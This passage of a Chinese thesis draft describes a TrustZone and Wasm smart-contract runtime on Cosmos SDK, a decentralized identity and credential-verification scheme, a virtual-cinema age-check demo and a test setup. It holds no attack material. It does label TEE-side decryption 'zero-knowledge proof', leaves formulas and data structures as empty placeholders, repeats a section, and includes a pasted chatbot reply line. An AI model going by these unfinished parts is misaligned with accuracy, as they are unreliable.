50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1593.2,0)\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(833,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(1333,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(3760,0)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4637.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5693.6,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span> 是否成立。</li>\n</ol>\n<p>ECDSA\n在本系统中用于用户身份的认证挑战与凭证签名验证，确保身份声明未被篡改且确实由对应\nDID 所属者生成。</p>\n<h1 id=\"系统设计与实现\">3 系统设计与实现</h1>\n<p>本章提出一种基于 TrustZone\n的智能合约执行架构，将合约逻辑与敏感数据处理隔离至安全世界，通过共享内存与扩展接口实现合约调用与链上状态的交互。该架构集成了\nWasm\n运行时，降低了开发门槛，并内置加密原语以支持隐私合约开发。在此基础上，本文设计并实现了一个分布式数字身份系统，支持DID注册、VC发放与加密VC验证，验证过程实现零知识证明。在应用层面，本文进一步构建了一个虚拟电影院场景：用户可向可信机构申请\nVC\n作为年龄凭证，并在不暴露具体年龄信息的前提下，向电影院证明其已年满法定观影年龄。</p>\n<h2 id=\"基于trustzone的wasm智能合约模块\">3.1\n基于TrustZone的Wasm智能合约模块</h2>\n<p>本系统基于 TrustZone 提出了一种轻量级的智能合约执行架构，如图 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.204ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 1416 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><a href=\"#\"><g data-mml-node=\"mrow\" class=\" MathJax_ref\"><rect data-hitbox=\"true\" fill=\"none\" stroke=\"none\" pointer-events=\"all\" width=\"1416\" height=\"705\" y=\"0\"/><g data-mml-node=\"mtext\"><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(472,0)\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(944,0)\"/></g></g></a></g></g></svg></mjx-container></span>\n所示。系统整体分为两个核心组成部分：一是基于 Cosmos SDK\n搭建的区块链节点，负责合约生命周期管理及链上状态维护；二是部署于\nTrustZone\n安全世界的智能合约执行模块，负责执行合约逻辑与处理敏感数据。两者通过共享内存与扩展接口实现安全协同。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\begin{figure}[h]</span><br><span class=\"line\">\\centering</span><br><span class=\"line\">\\includegraphics[width=1.1\\textwidth]{figure/系统架构图.pdf}</span><br><span class=\"line\">\\caption{基于 TrustZone 与 Wasm 的智能合约系统架构}</span><br><span class=\"line\">\\label{fig:system_architecture}</span><br><span class=\"line\">\\end{figure}</span><br></pre></td></tr></table></figure>\n<h3 id=\"智能合约管理模块\">3.1.1 智能合约管理模块</h3>\n<blockquote>\n<p>智能合约管理模块（链上）设计与实现</p>\n</blockquote>\n<p>本系统基于 Cosmos SDK\n框架构建区块链节点，并在此基础上设计并实现了一个专用于\nWasm智能合约生命周期管理的自定义模块。该模块负责协调合约的上传、实例化、调用与状态查询等核心操作，同时作为链上世界与\nTrustZone 安全世界之间的通信桥梁，支持智能合约请求的可信执行。</p>\n<p>该模块主要包含以下四类功能：</p>\n<p>（1）<strong>合约上传</strong>：用户通过交易提交已预编译为\nAOT（Ahead-of-Time）格式的 Wasm 字节码。相较于传统的解释执行方式，AOT\n格式合约在部署前完成静态机器码生成，具有启动速度快、执行效率高的优势。链上模块在接收字节码后会为合约生成唯一标识，并将其持久化存储于链上状态中；</p>\n<p>（2）<strong>合约实例化</strong>：用户可通过交易请求对某个已上传的字节码合约进行初始化，并传入初始化参数。系统将在链上为其创建一个新的合约账户，并调用合约中定义的\ninstantiate 函数完成状态初始化；</p>\n<p>（3）<strong>合约调用</strong>：用户可提交交易调用已部署的合约函数。系统保证每个合约实例在状态上彼此隔离，合约之间无法直接访问他人状态，确保逻辑封装性和执行安全性；</p>\n<p>（4）<strong>状态查询</strong>：用户可调用合约中的只读函数查询当前状态信息。与交易调用不同，状态查询为同步操作，直接从链上状态存储中读取数据并返回结果。</p>\n<p>在与 TrustZone\n的协作过程中，该模块还承担了重要的执行中继职责。具体而言，区块链节点会将用户提交的合约调用请求进行格式转换与权限校验，并构造执行参数通过安全通道传入部署于安全世界（TEE）中的\nTrusted Application（TA）。在实现上，我们将 TA host\n侧的通信逻辑封装为标准化的 C 语言库，并通过 cgo 接口集成至基于 Go\n实现的区块链模块中，使得主链逻辑能够以统一、透明的方式完成对 TEE\n的调用。</p>\n<p>在合约执行完成后，TA\n会将结果以结构化数据的形式返回至普通世界，由链上模块解析返回值并根据合约逻辑进行状态更新。为确保整个执行流程的一致性与事务完整性，该模块与\nTendermint\n共识机制深度集成，所有涉及状态变更的交易需经过共识确认后才会正式生效，从而确保了系统的可验证性与可信性。</p>\n<h3 id=\"智能合约执行模块\">3.1.2 智能合约执行模块</h3>\n<blockquote>\n<p>智能合约执行模块（TEE内）设计与实现</p>\n<p>跨环境通信机制设计（共享内存与扩展WASI接口）</p>\n</blockquote>\n<p>为了适应 TrustZone 受限的执行环境，本系统选用轻量级的 Wasm 运行时 ——\nWasm Micro Runtime（WAMR） 作为合约执行引擎。WAMR\n具有低内存占用、快速启动等特点，适用于资源受限的 TEE 场景。本系统在\nTrustZone 中部署 WAMR 的方式借鉴了 WaTZ 的设计思路\n，并对其进行了精简与定制，使其能在 OP-TEE 上高效加载并运行 AOT\n编译格式的 Wasm 合约。</p>\n<p>合约执行过程中需访问链上状态，而 TEE\n无法直接操作区块链节点的存储空间。为此，我们设计了一种基于\n共享内存与扩展 WASI 接口 的通信机制。具体而言，在 REE 与 TEE\n之间分配一段共享内存，区块链节点进程被划分为两个线程：主线程通过\nTEEC_InvokeCommand 向 TEE\n发起合约执行请求，副线程负责监听共享内存中的数据访问请求。当 TEE\n中的合约通过扩展的 WASI\n接口发起状态读取或修改操作时，会向共享内存写入结构化请求，REE\n侧捕捉到该请求后，从链状态中完成对应的数据读取或写入，并将结果写回共享内存，由\nTEE 获取返回结果继续执行。</p>\n<p>该共享机制配合一个跨语言的通信库协同实现：我们将 Go\n实现的状态访问逻辑封装为 C 可调用的函数指针，并通过回调注入到 TA host\n端，从而实现了跨世界、跨语言的高效状态访问路径。该设计支持按上下文与合约地址精确映射到对应存储空间，具备良好的可扩展性与安全边界控制能力。</p>\n<p>为支持隐私合约与链上可信交互，TEE\n内部集成了一套轻量级的加密原语，包括基于 ECDH 的共享密钥协商、基于 AES\n的对称加解密、以及基于 ECDSA\n的数字签名功能。在区块链节点部署前，系统将一个用于密钥交换的私钥写入 TEE\n内部的安全存储中，供后续加密通信使用。该私钥受到硬件隔离保护，外部无法访问或导出。智能合约通过扩展\nWASI\n接口即可便捷调用上述加密操作，从而实现包括身份认证、加密验证在内的多种隐私保护计算任务。</p>\n<h2 id=\"分布式数字身份系统\">3.2 分布式数字身份系统</h2>\n<p>本系统基于上文所述的基于 TrustZone 和 Wasm\n的智能合约执行架构，实现了一个支持集成化身份注册、凭证发放与加密凭证验证的分布式数字身份系统，应用于私人身份信息隐私保护场景下的可信校验。系统主要包括三类角色：用户（User）、凭证发行者（Issuer）和校验者（Verifier），其中合约逻辑由链上\nDID 智能合约执行。</p>\n<h3 id=\"数字身份注册\">3.2.1 数字身份注册</h3>\n<p>在系统中，用户需在本地生成两对非对称密钥对：一对用于身份认证中的数字签名，另一对用于与合约之间的密钥交换。所有密钥均基于椭圆曲线\nprime256v1（即 NIST\nP-256）生成，兼具安全性与较好的计算性能，适用于移动端和嵌入式设备 。</p>\n<p>用户将这两对密钥中的公钥提交至链上的 DID\n智能合约进行注册。合约在接收到公钥后，会生成一份 DID\n文档，其中包含用户的签名公钥和密钥交换公钥，并将该文档持久化存储在链上状态中，供后续身份验证和凭证校验使用。注册成功后，合约将返回一个唯一的\nDID 标识符（Decentralized\nIdentifier），用于在系统中标识用户身份，绑定其链上操作与相关凭证。</p>\n<h3 id=\"可验证凭证发放\">3.2.2 可验证凭证发放</h3>\n<p>在 VC\n的颁发阶段，凭证发行者（Issuer）通常为具有公信力的权威机构，如政府、学校或金融服务机构。系统默认该发行者已具备对用户真实身份的审核能力，而发行者获取用户真实身份信息的过程并非本系统关注的范畴。发行流程开始时，发行者向用户发送一次性挑战（challenge），用于确认用户对\nDID\n的所有权。用户使用其本地持有的签名私钥对挑战进行签名，并将签名结果返回。发行者随后从链上读取用户的\nDID\n文档，提取公钥验证签名的合法性，以此确认请求者与链上注册身份的一致性。身份确认完成后，发行者根据其掌握的用户信息生成一份\nVC，内容可能包括用户的姓名、年龄、住址等身份属性。该 VC\n在生成后直接交付给用户本地存储，而不会上链或公开发布。</p>\n<h3 id=\"加密凭证验证\">3.2.3 加密凭证验证</h3>\n<p>为保障用户身份凭证的隐私性，同时支持验证方对关键属性的可信校验，本系统设计了一种零知识证明验证方法。该流程使得验证者能够在不知晓\nVC 明文内容的前提下，判断用户是否满足某个属性条件（例如“年龄 ≥\n18”）。</p>\n<p>验证过程包括如下步骤：</p>\n<ol type=\"1\">\n<li><strong>共享密钥协商与 VC\n加密</strong>：用户使用自己的密钥交换私钥与部署时写入 TEE 的公钥执行\nECDH\n协议，协商出一组对称加密密钥。随后，用户使用该共享密钥对其本地存储的 VC\n内容进行 AES 加密，并将密文发送给验证者。</li>\n<li><strong>身份验证</strong>：验证者向用户发送一次性挑战，用户使用其签名私钥进行签名并返回。验证者从链上读取\nDID 文档，验证签名以确认其 DID 所有权。</li>\n<li><strong>验证请求提交</strong>：验证者将接收到的加密 VC 与用户 DID\n一并提交至链上 DID 智能合约模块，发起 VC 验证请求。</li>\n<li><strong>TEE\n内部解密与校验</strong>：区块链节点接收到请求后，将调用合约执行模块。系统通过\nTEE 中存储的私钥与用户 DID 文档中的公钥执行 ECDH\n协议，重构共享密钥。随后使用该密钥解密 VC，并验证 VC 中记录的 DID\n与请求用户是否匹配，若一致则进一步判断指定属性（如年龄）是否满足验证条件。</li>\n<li><strong>返回验证结果</strong>：TA 将验证结果（通过 /\n拒绝）返回给验证者。整个过程中，验证者始终无法获取 VC\n的明文内容，也无法从交互中反推出用户的真实身份属性。</li>\n</ol>\n<p>上述验证流程如图 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.204ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 1416 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><a href=\"#\"><g data-mml-node=\"mrow\" class=\" MathJax_ref\"><rect data-hitbox=\"true\" fill=\"none\" stroke=\"none\" pointer-events=\"all\" width=\"1416\" height=\"705\" y=\"0\"/><g data-mml-node=\"mtext\"><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(472,0)\"/><path data-c=\"3F\" d=\"M226 668Q190 668 162 656T124 632L114 621Q116 621 119 620T130 616T145 607T157 591T162 567Q162 544 147 529T109 514T71 528T55 566Q55 625 100 661T199 704Q201 704 210 704T224 705H228Q281 705 320 692T378 656T407 612T416 567Q416 503 361 462Q267 395 247 303Q242 279 242 241V224Q242 205 239 202T222 198T205 201T202 218V249Q204 320 220 371T255 445T292 491T315 537Q317 546 317 574V587Q317 604 315 615T304 640T277 661T226 668ZM162 61Q162 89 180 105T224 121Q247 119 264 104T281 61Q281 31 264 16T222 1Q197 1 180 16T162 61Z\" transform=\"translate(944,0)\"/></g></g></a></g></g></svg></mjx-container></span> 所示。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\begin{figure}[h] \\centering \\vspace*{-0.5cm} \\includegraphics[width=1.1\\textwidth]{figure/时序图.pdf} \\caption{VC 验证流程示意图} \\label{fig:workflow} \\end{figure}</span><br></pre></td></tr></table></figure>\n<p>该流程在无需构建复杂电路或生成加密证明的前提下，实现了零知识性质的属性验证，尤其适用于移动端、IoT\n等受限环境下的轻量级隐私计算场景。</p>\n<h2 id=\"元宇宙应用示例虚拟电影院场景实现\">3.3\n元宇宙应用示例：虚拟电影院场景实现</h2>\n<h3 id=\"总体系统架构\">3.3.1 总体系统架构</h3>\n<blockquote>\n<p>该系统分为四个主要模块：</p>\n<ol type=\"1\">\n<li>区块链网络，用于执行智能合约、存储用户的数字身份文档</li>\n<li>电影院服务，提供浏览电影、购票、检票等服务</li>\n<li>公安局服务，用于给用户提供出生证明。该系统中只有公安局唯一一个权威的\nVC 发行机构</li>\n<li>前端网页（客户端），用户在这里管理本地秘钥，向电影院、公安局、区块链发送各种请求。</li>\n</ol>\n</blockquote>\n<p>为验证所设计的分布式数字身份系统在实际场景中的可用性，本文构建了一个基于元宇宙虚拟空间的“虚拟电影院”应用。该系统围绕用户年龄验证展开身份认证与权限控制，确保用户在不暴露具体年龄的前提下，实现对成人观影内容的合规访问。</p>\n<p>系统整体架构如图所示，主要由以下四个功能模块构成：</p>\n<ol type=\"1\">\n<li><p><strong>区块链网络</strong></p>\n<p>该模块基于 Cosmos SDK\n搭建，并集成了本文提出的智能合约管理与执行模块。其主要职责包括：接受用户注册的\nDID 公钥对，生成并存储 DID\n文档；响应来自电影院或公安局发起的智能合约请求；协调与 TEE\n中合约执行模块的交互，完成 VC 的加密验证等功能。</p></li>\n<li><p><strong>电影院服务</strong></p>\n<p>电影院作为用户访问的应用服务端，提供观影内容浏览、购票下单、检票入场等功能。在检票环节，电影院系统需调用\nDID 合约对用户提交的加密 VC\n进行验证，判断其是否满足“已成年”的属性条件。</p></li>\n<li><p><strong>公安局服务</strong></p>\n<p>公安局是本系统中唯一的 VC\n发行机构，具有为用户签发年龄凭证的权威性。用户需通过签名验证向公安局证明其\nDID 所属身份，在完成身份核实后，公安局根据用户真实年龄生成\nVC，返回给用户本地保存。VC 内容不会上链，也不会泄露至第三方。</p></li>\n<li><p><strong>前端网页（客户端）</strong></p>\n<p>用户通过前端网页进行所有交互操作，包括 DID 注册、凭证申请、购票下单与\nVC\n提交等。前端本地管理用户生成的签名密钥对和密钥交换密钥对，支持在客户端执行对\nVC 的 AES\n加密和签名操作。前端亦承担构造请求并向各模块（区块链、公安局、电影院）发送交互消息的职责，是用户与系统交互的核心入口。</p></li>\n</ol>\n<p>该架构通过模块化设计实现身份认证与业务逻辑的解耦，并利用区块链与 TEE\n提供的可信执行能力，保障了用户身份数据的隐私性与验证过程的安全性。在不泄露敏感信息的前提下，用户仍可完成“是否成年”的零知识验证，体现了系统在实际场景下的工程适用性与隐私保护能力。</p>\n<h3 id=\"数据结构设计\">3.3.2 数据结构设计</h3>\n<p>这一小节将介绍系统中的数据结构设计。所有数据结构均在符合 W3C\n标准的前提下进行了一些简化。</p>\n<p>DID 标志符</p>\n<p>DID 文档</p>\n<p>VC</p>\n<h1 id=\"实验与测试\">4 实验与测试</h1>\n<h2 id=\"实验环境搭建与配置\">4.1 实验环境搭建与配置</h2>\n<blockquote>\n<ul>\n<li>论文中的 智能合约执行环境</li>\n<li>Node Express，Vue3 的电影院场景环境</li>\n</ul>\n</blockquote>\n<p>以下是中文毕业设计文档中 <strong>第4章 实验与测试</strong>\n的第一个小节：</p>\n<hr>\n<h2 id=\"实验与测试-1\"><strong>4 实验与测试</strong></h2>\n<h3 id=\"实验环境搭建与配置-1\"><strong>4.1\n实验环境搭建与配置</strong></h3>\n<p>本系统的实验测试工作在 Ubuntu 22.04 操作系统上完成，使用 QEMU v8.1.2\n构建 ARMv8 虚拟化平台，支持 ARM TrustZone 安全执行模式。TEE 执行环境基于\nOP-TEE v4.3.0 版本，QEMU 配置为双核处理器、1GB 内存，并启用了 secure=on\n参数以开启安全世界的模拟支持。</p>\n<p>所有交易与查询请求均通过 Cosmos SDK 提供的 RPC 接口完成，采用 REST\n协议发送 JSON 格式的消息。在客户端模拟方面，宿主机运行基于 JavaScript\n编写的脚本，用于模拟多个客户端发起并发请求。在实验设置中，客户端并发数从\n1 逐步增加至 32，每组配置下运行 5\n分钟，记录全过程的交易延迟与吞吐率。</p>\n<p>本节的性能测试主要包含两部分内容：（1）评估 Wasm 合约在 TEE 与 REE\n中执行性能的差异，测试对象为轻量级计数器合约，用以衡量硬件隔离机制所引入的性能开销；（2）测试\nDID 系统中的关键功能模块在 TEE 内的平均延迟，包括 DID 注册、DID\n文档查询以及 VC 验证，验证系统在实际身份隐私保护任务中的处理能力。</p>\n<p>为进一步分析 TrustZone\n架构对合约执行性能的影响，本文引入两项相对性能变化指标用于与 TZ4Fabric\n系统的间接对比。考虑到两系统在区块链平台、合约执行模型与硬件部署环境方面存在较大差异，直接比较原始延迟与吞吐率数据并不公平。因此，本研究采用以下两个指标：</p>\n<ul>\n<li><p><strong>吞吐率下降率（Throughput Degradation Rate,\nTDR）</strong></p>\n<p> = </p></li>\n<li><p><strong>延迟提升率（Latency Increase Rate, LIR）</strong></p>\n<p> = </p>\n<p>其中 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.375ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.865ex\" height=\"1.906ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -677 2150.5 842.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g></g></g></svg></mjx-container></span> 与 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.843ex\" height=\"1.871ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -677 2140.6 827\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 